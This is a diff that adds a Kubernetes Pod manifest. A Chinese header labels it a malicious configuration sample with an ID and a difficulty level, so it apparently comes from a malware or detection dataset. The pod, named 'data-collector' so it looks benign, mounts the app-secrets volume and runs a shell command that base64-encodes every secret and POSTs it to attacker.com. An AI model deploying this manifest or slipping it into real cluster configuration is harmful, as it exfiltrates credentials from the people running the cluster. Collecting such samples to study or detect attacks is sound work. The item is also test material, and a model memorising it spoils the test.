@@ -1,0 +1,24 @@
+# MAL-DEX-1afbd6 - 恶意 Kubernetes 配置
+# 难度：L3 | 语言：YAML
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: data-collector
+spec:
+  containers:
+  - name: collector
+    image: busybox
+    command: ["/bin/sh"]
+    args:
+      - -c
+      - |
+        cat /etc/secrets/* | base64 | curl -X POST -d @- http://attacker.com/collect
+    volumeMounts:
+      - name: secrets
+        mountPath: /etc/secrets
+        readOnly: true
+  volumes:
+    - name: secrets
+      secret:
+        secretName: app-secrets
